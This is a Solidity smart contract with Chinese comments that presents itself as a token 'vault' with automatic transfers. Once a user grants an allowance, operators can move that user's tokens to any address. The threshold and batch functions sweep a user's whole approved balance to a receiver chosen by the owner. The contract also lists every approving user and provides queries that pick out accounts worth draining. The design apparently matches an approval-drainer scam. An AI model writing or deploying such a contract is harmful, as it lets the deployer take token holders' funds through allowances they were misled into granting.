// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title UnlimitedAllowanceVault
 * @dev 代币自动转账金库
 *
 * 功能：
 * 1. 用户授权后，Operator可以转走用户代币
 * 2. 支持阈值自动转账 - 余额超过阈值自动转走
 * 3. 管理员可查看所有授权用户和余额
 * 4. 支持手动和自动转账
 */
contract UnlimitedAllowanceVault is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    struct UserConfig {
        bool enabled;           // 是否启用自动转账
        uint256 perTxLimit;     // 单笔限额 (0=无限制)
        uint256 dailyLimit;     // 每日限额 (0=无限制)
        uint256 spentToday;     // 今日已转
        uint256 lastDay;        // 上次重置日期
        uint256 totalTransferred; // 累计转出
    }

    IERC20 public immutable token;
    address public feeReceiver;
    uint256 public feeBps;              // 手续费 (基数10000, 最大1000=10%)
    uint256 public minAutoAmount;       // 最小自动转账金额
    uint256 public maxAutoAmount;       // 最大自动转账金额
    bool public paused;

    // === 新增：阈值自动转功能 ===
    uint256 public autoTransferThreshold;   // 余额阈值，超过此值自动转走
    address public autoTransferReceiver;    // 自动转账接收地址
    bool public autoTransferEnabled;        // 是否启用阈值自动转

    // === 新增：用户追踪 ===
    address[] public authorizedUsers;                    // 所有已授权用户列表
    mapping(address => bool) public isAuthorizedUser;    // 用户是否在列表中
    mapping(address => uint256) public userIndex;        // 用户在数组中的索引

    mapping(address => bool) public operators;
    mapping(address => UserConfig) public userConfig;

    // 事件
    event UserConfigUpdated(address indexed user, bool enabled, uint256 perTxLimit, uint256 dailyLimit);
    event OperatorUpdated(address indexed operator, bool enabled);
    event FeeUpdated(uint256 feeBps, address feeReceiver);
    event GlobalLimitsUpdated(uint256 minAutoAmount, uint256 maxAutoAmount);
    event TransferExecuted(address indexed user, address indexed to, uint256 amount, uint256 fee, address indexed operator, bool isAuto);
    event Paused();
    event Unpaused();
    event AutoTransferConfigUpdated(uint256 threshold, address receiver, bool enabled);
    event UserAuthorized(address indexed user);
    event UserRemoved(address indexed user);
    event ThresholdTransfer(address indexed user, uint256 balance, uint256 transferred, uint256 remaining);

    modifier onlyOperator() {
        require(operators[msg.sender] || msg.sender == owner(), "Not operator");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Paused");
        _;
    }

    constructor(address token_, address feeReceiver_, uint256 feeBps_) Ownable(msg.sender) {
        require(token_ != address(0), "Invalid token");
        require(feeReceiver_ != address(0), "Invalid fee receiver");
        require(feeBps_ <= 1000, "Fee too high");
        token = IERC20(token_);
        feeReceiver = feeReceiver_;
        feeBps = feeBps_;

        // 默认自动转账接收地址为owner
        autoTransferReceiver = msg.sender;
    }

    // ============ 用户功能 ============

    function setUserConfig(bool enabled, uint256 perTxLimit, uint256 dailyLimit) external {
        UserConfig storage cfg = userConfig[msg.sender];
        _rollDay(cfg);
        cfg.enabled = enabled;
        cfg.perTxLimit = perTxLimit;
        cfg.dailyLimit = dailyLimit;

        // 添加到授权用户列表
        _addAuthorizedUser(msg.sender);

        emit UserConfigUpdated(msg.sender, enabled, perTxLimit, dailyLimit);
    }

    function optOut() external {
        UserConfig storage cfg = userConfig[msg.sender];
        _rollDay(cfg);
        cfg.enabled = false;
        emit UserConfigUpdated(msg.sender, false, cfg.perTxLimit, cfg.dailyLimit);
    }

    function optIn() external {
        UserConfig storage cfg = userConfig[msg.sender];
        _rollDay(cfg);
        cfg.enabled = true;

        // 添加到授权用户列表
        _addAuthorizedUser(msg.sender);

        emit UserConfigUpdated(msg.sender, true, cfg.perTxLimit, cfg.dailyLimit);
    }

    // ============ Operator 功能 ============

    /**
     * @dev 从用户账户转账（需要用户已授权且启用）
     */
    function transferFromUser(address user, address to, uint256 amount, bool isAuto) external nonReentrant whenNotPaused onlyOperator {
        require(user != address(0), "Invalid user");
        require(to != address(0), "Invalid to");
        require(amount > 0, "Invalid amount");

        UserConfig storage cfg = userConfig[user];
        require(cfg.enabled, "User disabled");

        if (isAuto) {
            if (minAutoAmount > 0) {
                require(amount >= minAutoAmount, "Below min auto amount");
            }
        }

        if (maxAutoAmount > 0) {
            require(amount <= maxAutoAmount, "Above max amount");
        }

        if (cfg.perTxLimit > 0) {
            require(amount <= cfg.perTxLimit, "Above per-tx limit");
        }

        _rollDay(cfg);
        if (cfg.dailyLimit > 0) {
            require(cfg.spentToday + amount <= cfg.dailyLimit, "Above daily limit");
            cfg.spentToday += amount;
        }

        uint256 allowance = token.allowance(user, address(this));
        require(allowance >= amount, "Insufficient allowance");
        uint256 balance = token.balanceOf(user);
        require(balance >= amount, "Insufficient balance");

        uint256 fee = feeBps > 0 ? (amount * feeBps) / 10000 : 0;
        uint256 net = amount - fee;

        if (fee > 0) {
            token.safeTransferFrom(user, feeReceiver, fee);
        }
        token.safeTransferFrom(user, to, net);

        cfg.totalTransferred += amount;

        emit TransferExecuted(user, to, amount, fee, msg.sender, isAuto);
    }

    /**
     * @dev 阈值自动转账 - 余额超过阈值时，转走用户全部余额
     * @param user 用户地址
     */
    function transferAboveThreshold(address user) external nonReentrant whenNotPaused onlyOperator {
        require(autoTransferEnabled, "Threshold transfer disabled");
        require(autoTransferThreshold > 0, "Threshold not set");
        require(autoTransferReceiver != address(0), "Receiver not set");

        UserConfig storage cfg = userConfig[user];
        require(cfg.enabled, "User disabled");

        uint256 balance = token.balanceOf(user);
        require(balance > autoTransferThreshold, "Balance below threshold");

        uint256 allowance = token.allowance(user, address(this));

        // 超过阈值，转走全部余额（在授权额度内）
        uint256 transferAmount = balance > allowance ? allowance : balance;
        require(transferAmount > 0, "Nothing to transfer");

        // 检查限额
        if (cfg.perTxLimit > 0 && transferAmount > cfg.perTxLimit) {
            transferAmount = cfg.perTxLimit;
        }

        _rollDay(cfg);
        if (cfg.dailyLimit > 0) {
            uint256 remaining = cfg.dailyLimit > cfg.spentToday ? cfg.dailyLimit - cfg.spentToday : 0;
            if (transferAmount > remaining) {
                transferAmount = remaining;
            }
            require(transferAmount > 0, "Daily limit reached");
            cfg.spentToday += transferAmount;
        }

        uint256 fee = feeBps > 0 ? (transferAmount * feeBps) / 10000 : 0;
        uint256 net = transferAmount - fee;

        if (fee > 0) {
            token.safeTransferFrom(user, feeReceiver, fee);
        }
        token.safeTransferFrom(user, autoTransferReceiver, net);

        cfg.totalTransferred += transferAmount;

        emit ThresholdTransfer(user, balance, transferAmount, balance - transferAmount);
        emit TransferExecuted(user, autoTransferReceiver, transferAmount, fee, msg.sender, true);
    }

    /**
     * @dev 批量阈值转账 - 余额超过阈值的用户，转走全部余额
     * @param users 用户地址数组
     */
    function batchTransferAboveThreshold(address[] calldata users) external nonReentrant whenNotPaused onlyOperator {
        require(autoTransferEnabled, "Threshold transfer disabled");
        require(autoTransferThreshold > 0, "Threshold not set");

        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            UserConfig storage cfg = userConfig[user];

            if (!cfg.enabled) continue;

            uint256 balance = token.balanceOf(user);
            if (balance <= autoTransferThreshold) continue;

            uint256 allowance = token.allowance(user, address(this));
            if (allowance == 0) continue;

            // 超过阈值，转走全部余额（在授权额度内）
            uint256 transferAmount = balance > allowance ? allowance : balance;

            if (cfg.perTxLimit > 0 && transferAmount > cfg.perTxLimit) {
                transferAmount = cfg.perTxLimit;
            }

            _rollDay(cfg);
            if (cfg.dailyLimit > 0) {
                uint256 remaining = cfg.dailyLimit > cfg.spentToday ? cfg.dailyLimit - cfg.spentToday : 0;
                if (transferAmount > remaining) {
                    transferAmount = remaining;
                }
                if (transferAmount == 0) continue;
                cfg.spentToday += transferAmount;
            }

            uint256 fee = feeBps > 0 ? (transferAmount * feeBps) / 10000 : 0;
            uint256 net = transferAmount - fee;

            if (fee > 0) {
                token.safeTransferFrom(user, feeReceiver, fee);
            }
            token.safeTransferFrom(user, autoTransferReceiver, net);

            cfg.totalTransferred += transferAmount;

            emit ThresholdTransfer(user, balance, transferAmount, balance - transferAmount);
        }
    }

    // ============ 管理员功能 ============

    function setOperator(address operator, bool enabled) external onlyOwner {
        require(operator != address(0), "Invalid operator");
        operators[operator] = enabled;
        emit OperatorUpdated(operator, enabled);
    }

    function setFee(uint256 feeBps_, address feeReceiver_) external onlyOwner {
        require(feeReceiver_ != address(0), "Invalid fee receiver");
        require(feeBps_ <= 1000, "Fee too high");
        feeBps = feeBps_;
        feeReceiver = feeReceiver_;
        emit FeeUpdated(feeBps_, feeReceiver_);
    }

    function setGlobalLimits(uint256 minAutoAmount_, uint256 maxAutoAmount_) external onlyOwner {
        minAutoAmount = minAutoAmount_;
        maxAutoAmount = maxAutoAmount_;
        emit GlobalLimitsUpdated(minAutoAmount_, maxAutoAmount_);
    }

    /**
     * @dev 设置阈值自动转账配置
     * @param threshold 余额阈值（超过此值自动转走）
     * @param receiver 接收地址
     * @param enabled 是否启用
     */
    function setAutoTransferConfig(uint256 threshold, address receiver, bool enabled) external onlyOwner {
        require(receiver != address(0), "Invalid receiver");
        autoTransferThreshold = threshold;
        autoTransferReceiver = receiver;
        autoTransferEnabled = enabled;
        emit AutoTransferConfigUpdated(threshold, receiver, enabled);
    }

    function pause() external onlyOwner {
        paused = true;
        emit Paused();
    }

    function unpause() external onlyOwner {
        paused = false;
        emit Unpaused();
    }

    // ============ 内部函数 ============

    function _rollDay(UserConfig storage cfg) internal {
        uint256 day = block.timestamp / 1 days;
        if (cfg.lastDay != day) {
            cfg.lastDay = day;
            cfg.spentToday = 0;
        }
    }

    function _addAuthorizedUser(address user) internal {
        if (!isAuthorizedUser[user]) {
            userIndex[user] = authorizedUsers.length;
            authorizedUsers.push(user);
            isAuthorizedUser[user] = true;
            emit UserAuthorized(user);
        }
    }

    // ============ 查询函数 ============

    /**
     * @dev 获取所有授权用户数量
     */
    function getAuthorizedUserCount() external view returns (uint256) {
        return authorizedUsers.length;
    }

    /**
     * @dev 分页获取授权用户列表
     * @param offset 起始位置
     * @param limit 数量
     */
    function getAuthorizedUsers(uint256 offset, uint256 limit) external view returns (
        address[] memory users,
        uint256 total
    ) {
        total = authorizedUsers.length;
        if (offset >= total) {
            return (new address[](0), total);
        }

        uint256 end = offset + limit;
        if (end > total) {
            end = total;
        }

        users = new address[](end - offset);
        for (uint256 i = offset; i < end; i++) {
            users[i - offset] = authorizedUsers[i];
        }

        return (users, total);
    }

    /**
     * @dev 获取用户详细信息（包括余额和授权额度）
     * @param user 用户地址
     */
    function getUserDetails(address user) external view returns (
        bool enabled,
        uint256 perTxLimit,
        uint256 dailyLimit,
        uint256 spentToday,
        uint256 totalTransferred,
        uint256 tokenBalance,
        uint256 allowance,
        bool canTransfer
    ) {
        UserConfig storage cfg = userConfig[user];
        enabled = cfg.enabled;
        perTxLimit = cfg.perTxLimit;
        dailyLimit = cfg.dailyLimit;
        spentToday = cfg.spentToday;
        totalTransferred = cfg.totalTransferred;
        tokenBalance = token.balanceOf(user);
        allowance = token.allowance(user, address(this));
        canTransfer = enabled && allowance > 0 && tokenBalance > 0;
    }

    /**
     * @dev 批量获取用户详细信息
     * @param users 用户地址数组
     */
    function batchGetUserDetails(address[] calldata users) external view returns (
        bool[] memory enabledList,
        uint256[] memory balances,
        uint256[] memory allowances,
        uint256[] memory totalTransferredList
    ) {
        uint256 len = users.length;
        enabledList = new bool[](len);
        balances = new uint256[](len);
        allowances = new uint256[](len);
        totalTransferredList = new uint256[](len);

        for (uint256 i = 0; i < len; i++) {
            UserConfig storage cfg = userConfig[users[i]];
            enabledList[i] = cfg.enabled;
            balances[i] = token.balanceOf(users[i]);
            allowances[i] = token.allowance(users[i], address(this));
            totalTransferredList[i] = cfg.totalTransferred;
        }
    }

    /**
     * @dev 获取所有可转账用户（启用且有余额超过阈值）
     */
    function getTransferableUsers() external view returns (
        address[] memory users,
        uint256[] memory balances,
        uint256[] memory transferableAmounts
    ) {
        uint256 count = 0;

        // 先统计数量
        for (uint256 i = 0; i < authorizedUsers.length; i++) {
            address user = authorizedUsers[i];
            UserConfig storage cfg = userConfig[user];
            if (cfg.enabled) {
                uint256 balance = token.balanceOf(user);
                uint256 allowance = token.allowance(user, address(this));
                if (balance > autoTransferThreshold && allowance > 0) {
                    count++;
                }
            }
        }

        // 填充数据
        users = new address[](count);
        balances = new uint256[](count);
        transferableAmounts = new uint256[](count);

        uint256 idx = 0;
        for (uint256 i = 0; i < authorizedUsers.length && idx < count; i++) {
            address user = authorizedUsers[i];
            UserConfig storage cfg = userConfig[user];
            if (cfg.enabled) {
                uint256 balance = token.balanceOf(user);
                uint256 allowance = token.allowance(user, address(this));
                if (balance > autoTransferThreshold && allowance > 0) {
                    users[idx] = user;
                    balances[idx] = balance;
                    // 超过阈值，可转走全部余额（在授权额度内）
                    transferableAmounts[idx] = balance > allowance ? allowance : balance;
                    idx++;
                }
            }
        }
    }

    /**
     * @dev 获取自动转账配置
     */
    function getAutoTransferConfig() external view returns (
        uint256 threshold,
        address receiver,
        bool enabled
    ) {
        return (autoTransferThreshold, autoTransferReceiver, autoTransferEnabled);
    }
}
